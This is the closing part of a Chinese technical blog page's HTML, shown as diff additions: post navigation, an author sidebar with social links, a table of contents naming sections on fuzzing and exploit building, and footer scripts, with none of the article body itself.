+              <a href="/2019/04/12/汇编语言/Win32汇编语言基础-1/" rel="next" title="Win32汇编语言基础(1)">
+                <i class="fa fa-chevron-left"></i> Win32汇编语言基础(1)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="王瑞">
+            
+              <p class="site-author-name" itemprop="name">王瑞</p>
+              <div class="site-description motion-element" itemprop="description">记录点滴技术成长之路</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/lyshark" title="GitHub &rarr; https://github.com/lyshark" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="mailto:1181506874@qq.com" title="E-Mail &rarr; mailto:1181506874@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://plus.google.com/lyshark" title="Google &rarr; https://plus.google.com/lyshark" rel="noopener" target="_blank"><i class="fa fa-fw fa-google"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/lyshark" title="Twitter &rarr; https://twitter.com/lyshark" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="http://wpa.qq.com/msgrd?v=3&uin=1181506874&site=hupaiyule&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1181506874&site=hupaiyule&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i></a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                  
+                    
+                  
+                  <a href="https://weixin.qq.com" title="Wechat &rarr; https://weixin.qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-weixin"></i></a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#执行模糊测试"><span class="nav-text">执行模糊测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#控制EIP指针"><span class="nav-text">控制EIP指针</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构建漏洞攻击"><span class="nav-text">构建漏洞攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成利用代码"><span class="nav-text">生成利用代码</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+
+<!-- 屏蔽版权开始 -->
+&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">王瑞</span>
+<!-- 屏蔽版权结束 -->
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
